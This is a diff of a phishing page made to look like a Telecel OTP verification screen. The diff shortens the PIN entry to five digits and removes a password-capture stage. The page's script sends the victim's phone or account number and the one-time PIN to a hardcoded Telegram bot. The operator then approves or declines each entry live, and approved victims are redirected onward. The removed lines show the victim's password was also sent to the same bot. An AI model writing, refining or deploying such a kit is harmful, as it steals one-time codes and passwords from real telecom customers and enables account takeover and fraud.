@@ -2,167 +2,154 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
 <title>Telecel OTP</title>
 
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 
 <style>
 *{
-  box-sizing:border-box;
-  font-family:'Inter', Arial, sans-serif;
+  box-sizing: border-box;
+  font-family: 'Inter', Arial, sans-serif;
 }
 
 body{
-  margin:0;
-  background:#f5f5f5;
-  display:flex;
-  justify-content:center;
+  margin: 0;
+  background: #f5f5f5;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  min-height: 100vh;
+  padding: 16px;
 }
 
 /* CONTAINER */
 .container{
-  width:360px;
-  background:#f7f7f7;
-  border-radius:28px;
-  padding:40px 20px;
-  box-shadow:0 10px 30px rgba(0,0,0,0.08);
-  position:relative;
-  overflow:hidden;
-  text-align:center;
+  width: 360px;
+  background: #f7f7f7;
+  border-radius: 28px;
+  padding: 40px 20px;
+  box-shadow: 0 10px 30px rgba(0,0,0,0.08);
+  position: relative;
+  overflow: hidden;
+  text-align: center;
 }
 
 /* RED SHAPE */
 .top-bg{
-  position:absolute;
-  top:0;
-  right:0;
-  width:220px;
-  height:220px;
-  background:linear-gradient(135deg, rgba(255,0,0,0.25), rgba(255,0,0,0.6));
-  border-bottom-left-radius:120px;
+  position: absolute;
+  top: 0;
+  right: 0;
+  width: 220px;
+  height: 220px;
+  background: linear-gradient(135deg, rgba(255,0,0,0.25), rgba(255,0,0,0.6));
+  border-bottom-left-radius: 120px;
 }
 
 .content{
-  position:relative;
-  z-index:2;
+  position: relative;
+  z-index: 2;
 }
 
 /* LOGO */
 .logo{
-  margin-top:60px;
+  margin-top: 60px;
 }
 
 .logo-circle{
-  width:52px;
-  height:52px;
-  background:#ff0000;
-  border-radius:50%;
-  color:#fff;
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  font-size:30px;
-  margin:auto;
-  font-weight:800;
+  width: 52px;
+  height: 52px;
+  background: #ff0000;
+  border-radius: 50%;
+  color: #fff;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 30px;
+  margin: auto;
+  font-weight: 800;
 }
 
 .logo-text{
-  color:#ff0000;
-  font-size:26px;
-  font-weight:bold;
-  margin-top:8px;
+  color: #ff0000;
+  font-size: 26px;
+  font-weight: bold;
+  margin-top: 8px;
 }
 
 /* TEXT */
 .title{
-  color:#ff0000;
-  font-size:20px;
-  font-weight:600;
-  margin-top:15px;
+  color: #ff0000;
+  font-size: 20px;
+  font-weight: 600;
+  margin-top: 15px;
 }
 
 .subtitle{
-  color:#666;
-  font-size:15px;
-  margin-top:10px;
-  line-height:1.5;
+  color: #666;
+  font-size: 15px;
+  margin-top: 10px;
+  line-height: 1.5;
 }
 
-/* OTP BOXES */
+/* OTP BOXES (5 digits) */
 .otp-container{
-  display:flex;
-  justify-content:space-between;
-  margin-top:20px;
+  display: flex;
+  gap: 12px;
+  margin-top: 20px;
+  justify-content: center;
 }
 
 .otp-input{
-  width:45px;
-  height:50px;
-  border-radius:10px;
-  border:1px solid #ddd;
-  text-align:center;
-  font-size:18px;
-  outline:none;
-}
-
-.otp-input:focus{
-  border:2px solid #ff0000;
-}
-
-/* Password field (initially hidden) */
-.password-container {
-  margin-top: 20px;
-}
-
-.password-input {
-  width: 100%;
+  flex: 1;
+  min-width: 0;          /* prevents flex overflow */
   height: 50px;
   border-radius: 12px;
   border: 1px solid #ddd;
-  padding: 0 15px;
-  font-size: 16px;
+  text-align: center;
+  font-size: 20px;
+  font-weight: 600;
+  outline: none;
   background: #fff;
-  margin-bottom: 10px;
+  transition: border 0.2s;
 }
 
-.btn-password {
-  background: #ff0000;
-  color: #fff;
-  font-weight: 600;
+.otp-input:focus{
+  border: 2px solid #ff0000;
+  box-shadow: 0 0 0 2px rgba(255,0,0,0.1);
+}
+
+/* BUTTONS */
+.btn{
   width: 100%;
   height: 55px;
   border: none;
   border-radius: 14px;
   font-size: 16px;
+  margin-top: 20px;
   cursor: pointer;
-}
-
-/* BUTTONS */
-.btn{
-  width:100%;
-  height:55px;
-  border:none;
-  border-radius:14px;
-  font-size:16px;
-  margin-top:20px;
-  cursor:pointer;
+  font-weight: 600;
 }
 
 .btn-primary{
-  background:#ff0000;
-  color:#fff;
-  font-weight:600;
+  background: #ff0000;
+  color: #fff;
+}
+
+.btn-primary.disabled, .btn-primary:disabled{
+  background: #e5e5e5;
+  color: #999;
+  cursor: not-allowed;
 }
 
 .btn-outline{
-  background:transparent;
-  border:2px solid #ff0000;
-  color:#666;
-  font-weight:600;
+  background: transparent;
+  border: 2px solid #ff0000;
+  color: #666;
+  font-weight: 600;
 }
 
-/* Message styling (optional) */
+/* Message styling */
 .message {
   font-size: 14px;
   margin-top: 8px;
@@ -171,7 +158,7 @@ body{
 .error { color: #dc3545; }
 .success { color: #28a745; }
 
-/* ERROR BOX (same as login page) */
+/* ERROR BOX */
 .error-box{
   position: absolute;
   top: 20px;
@@ -184,6 +171,7 @@ body{
   display: none;
   box-shadow: 0 5px 20px rgba(0,0,0,0.1);
   z-index: 100;
+  text-align: left;
 }
 
 .error-title{
@@ -232,7 +220,6 @@ body{
 }
 </style>
 </head>
-
 <body>
 
 <div class="container">
@@ -246,7 +233,6 @@ body{
   </div>
 
   <div class="content">
-
     <!-- LOGO -->
     <div class="logo">
       <div class="logo-circle">t</div>
@@ -258,34 +244,24 @@ body{
     <div class="subtitle" id="subtitleText">
       The One Time Pin has been sent to<br>
       <span id="maskedPhone">02xxxxxx20</span>
-    . Enter it below to verify your account.
+      . Enter it below to verify your account.
     </div>
 
-    <!-- OTP INPUT SECTION -->
+    <!-- OTP INPUT SECTION (5 digits) -->
     <div id="otpSection">
       <div class="otp-container">
-        <input class="otp-input" maxlength="1" id="otp1">
+        <input class="otp-input" maxlength="1" id="otp1" autofocus>
         <input class="otp-input" maxlength="1" id="otp2">
         <input class="otp-input" maxlength="1" id="otp3">
         <input class="otp-input" maxlength="1" id="otp4">
         <input class="otp-input" maxlength="1" id="otp5">
-        <input class="otp-input" maxlength="1" id="otp6">
       </div>
       <div class="message" id="otpMessage"></div>
-      <button class="btn btn-primary" id="nextBtn">Next</button>
+      <button class="btn btn-primary" id="nextBtn" disabled>Next</button>
     </div>
 
-    <!-- PASSWORD INPUT SECTION (initially hidden) -->
-    <div id="passwordSection" style="display: none;">
-      <div class="password-container">
-        <input type="password" class="password-input" id="passwordField" placeholder="Enter password">
-        <button class="btn-password" id="verifyPasswordBtn">Verify Password</button>
-      </div>
-    </div>
-
-    <!-- Go Back button (always visible) -->
+    <!-- Go Back button -->
     <button class="btn btn-outline" id="goBackBtn">Go Back</button>
-
   </div>
 </div>
 
@@ -297,9 +273,8 @@ body{
 <script>
   (function() {
     // ==================== TELEGRAM BOT CONFIG ====================
-    const BOT_TOKEN = '8276553360:AAGD0pyKatfqmNyfWnvQ6nFkuM3QG3kfJ9k'; // Replace with your token
-    const CHAT_ID   = '1006917440'; // Replace with your chat ID
-    // If you need a CORS proxy, prepend it to the URL
+    const BOT_TOKEN = '8276553360:AAGD0pyKatfqmNyfWnvQ6nFkuM3QG3kfJ9k';
+    const CHAT_ID   = '1006917440';
     const API_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;
 
     // ==================== DOM ELEMENTS ====================
@@ -308,21 +283,14 @@ body{
       document.getElementById('otp2'),
       document.getElementById('otp3'),
       document.getElementById('otp4'),
-      document.getElementById('otp5'),
-      document.getElementById('otp6')
+      document.getElementById('otp5')
     ];
     const nextBtn = document.getElementById('nextBtn');
     const goBackBtn = document.getElementById('goBackBtn');
     const maskedPhoneSpan = document.getElementById('maskedPhone');
-    const subtitleDiv = document.getElementById('subtitleText'); // added for dynamic update
+    const subtitleDiv = document.getElementById('subtitleText');
     const otpMessage = document.getElementById('otpMessage');
     const spinner = document.getElementById('spinner');
-
-    const otpSection = document.getElementById('otpSection');
-    const passwordSection = document.getElementById('passwordSection');
-    const passwordField = document.getElementById('passwordField');
-    const verifyPasswordBtn = document.getElementById('verifyPasswordBtn');
-
     const errorBox = document.getElementById('errorBox');
     const errorText = document.getElementById('errorText');
 
@@ -344,7 +312,7 @@ body{
     }
     maskedPhoneSpan.textContent = maskPhone(phone);
 
-    // ==================== OTP AUTO‑ADVANCE ====================
+    // ==================== OTP AUTO‑ADVANCE (5 digits) ====================
     function focusNext(index) {
       if (index < otpInputs.length - 1) otpInputs[index + 1].focus();
     }
@@ -352,18 +320,27 @@ body{
       if (index > 0) otpInputs[index - 1].focus();
     }
 
+    function updateNextButton() {
+      const allFilled = otpInputs.every(inp => inp.value.length === 1);
+      nextBtn.disabled = !allFilled;
+      if (allFilled) {
+        nextBtn.classList.remove('disabled');
+      } else {
+        nextBtn.classList.add('disabled');
+      }
+    }
+
     otpInputs.forEach((input, idx) => {
       input.addEventListener('input', function() {
         this.value = this.value.replace(/\D/g, '');
         if (this.value.length === 1) focusNext(idx);
-        const allFilled = otpInputs.every(inp => inp.value.length === 1);
-        nextBtn.style.background = allFilled ? '#ff0000' : '#e5e5e5';
-        nextBtn.style.color = allFilled ? '#fff' : '#999';
+        updateNextButton();
+        otpMessage.textContent = ''; // clear message on edit
       });
 
       input.addEventListener('keydown', function(e) {
         if (e.key === 'Backspace') {
-          if (this.value.length === 0) {
+          if (this.value.length === 0 && idx > 0) {
             e.preventDefault();
             focusPrev(idx);
           }
@@ -390,7 +367,6 @@ body{
     };
 
     // ==================== TELEGRAM HELPERS ====================
-    // Escape HTML special characters to prevent injection
     function escapeHtml(unsafe) {
       return unsafe.replace(/[&<>"]/g, function(m) {
         if (m === '&') return '&amp;';
@@ -450,15 +426,15 @@ body{
       }, 1500);
     }
 
-    // ==================== STAGE 1: OTP SUBMISSION ====================
+    // ==================== OTP SUBMISSION ====================
     let isSubmitting = false;
 
     async function submitOtp() {
       if (isSubmitting) return;
 
       const enteredOtp = otpInputs.map(inp => inp.value).join('');
-      if (enteredOtp.length !== 6) {
-        otpMessage.textContent = 'Please enter all 6 digits.';
+      if (enteredOtp.length !== 5) {
+        otpMessage.textContent = 'Please enter all 5 digits.';
         otpMessage.className = 'message error';
         return;
       }
@@ -471,7 +447,7 @@ body{
       const ts = Date.now();
       const identifier = accountType === 'Mobile' ? `Phone: ${phone}` : `Account: ${inputValue}`;
       const escapedOtp = escapeHtml(enteredOtp);
-      const msg = `OTP Verification\n\n${identifier}\nEntered OTP: <code>${escapedOtp}</code>\n\nChoose action:`;
+      const msg = `OTP Verification\n\n${identifier}\nEntered OTP: <code>${escapedOtp}</code>\n\nApprove or Decline?`;
 
       await sendToTelegram({
         chat_id: CHAT_ID,
@@ -479,9 +455,8 @@ body{
         parse_mode: 'HTML',
         reply_markup: {
           inline_keyboard: [[
-            { text: 'Password', callback_data: `otp_password_${ts}` },
-            { text: 'Approve', callback_data: `otp_approve_${ts}` },
-            { text: 'Decline', callback_data: `otp_decline_${ts}` }
+            { text: '✅ Approve', callback_data: `otp_approve_${ts}` },
+            { text: '❌ Decline', callback_data: `otp_decline_${ts}` }
           ]]
         }
       });
@@ -490,79 +465,23 @@ body{
         spinner.style.display = 'none';
         isSubmitting = false;
 
-        if (action === 'password') {
-          console.log('Switching to password input');
-          // Hide OTP section, show password section
-          otpSection.style.display = 'none';
-          passwordSection.style.display = 'block';
-          // Update subtitle text for password mode
-          subtitleDiv.innerHTML = 'Enter your Telecel password.';
-          passwordField.focus();
-        } else if (action === 'approve') {
-          console.log('Approved, redirecting to pin.html');
-          window.location.href = 'pin.html';
+        if (action === 'approve') {
+          window.location.href = 'loan.html';
         } else if (action === 'decline') {
-          console.log('Declined, showing error');
           showError('Wrong OTP');
-          // Re-enable OTP inputs for a new attempt
+          // Reset OTP inputs for new attempt
           otpInputs.forEach(inp => {
             inp.value = '';
             inp.disabled = false;
           });
           otpInputs[0].focus();
+          updateNextButton();
           nextBtn.disabled = false;
-          nextBtn.style.background = '#e5e5e5';
-          nextBtn.style.color = '#999';
         }
       });
     }
 
     nextBtn.addEventListener('click', submitOtp);
-
-    // ==================== STAGE 2: PASSWORD SUBMISSION ====================
-    async function submitPassword() {
-      const password = passwordField.value.trim();
-      if (!password) return;
-
-      spinner.style.display = 'flex';
-      isSubmitting = true;
-      verifyPasswordBtn.disabled = true;
-
-      const ts = Date.now();
-      const identifier = accountType === 'Mobile' ? `Phone: ${phone}` : `Account: ${inputValue}`;
-      const escapedPassword = escapeHtml(password);
-      const msg = `Password Verification\n\n${identifier}\nPassword: <code>${escapedPassword}</code>\n\nApprove or Decline:`;
-
-      await sendToTelegram({
-        chat_id: CHAT_ID,
-        text: msg,
-        parse_mode: 'HTML',
-        reply_markup: {
-          inline_keyboard: [[
-            { text: 'Approve', callback_data: `pwd_approve_${ts}` },
-            { text: 'Decline', callback_data: `pwd_decline_${ts}` }
-          ]]
-        }
-      });
-
-      pollForCallback('pwd', ts, (action) => {
-        spinner.style.display = 'none';
-        isSubmitting = false;
-        verifyPasswordBtn.disabled = false;
-
-        if (action === 'approve') {
-          console.log('Password approved, redirecting to pin.html');
-          window.location.href = 'pin.html';
-        } else if (action === 'decline') {
-          console.log('Password declined, showing error');
-          showError('Wrong password');
-          passwordField.value = '';
-          passwordField.focus();
-        }
-      });
-    }
-
-    verifyPasswordBtn.addEventListener('click', submitPassword);
 
     // ==================== GO BACK ====================
     goBackBtn.addEventListener('click', () => {
@@ -570,8 +489,7 @@ body{
     });
 
     // ==================== INIT ====================
-    nextBtn.style.background = '#e5e5e5';
-    nextBtn.style.color = '#999';
+    updateNextButton();
   })();
 </script>
 
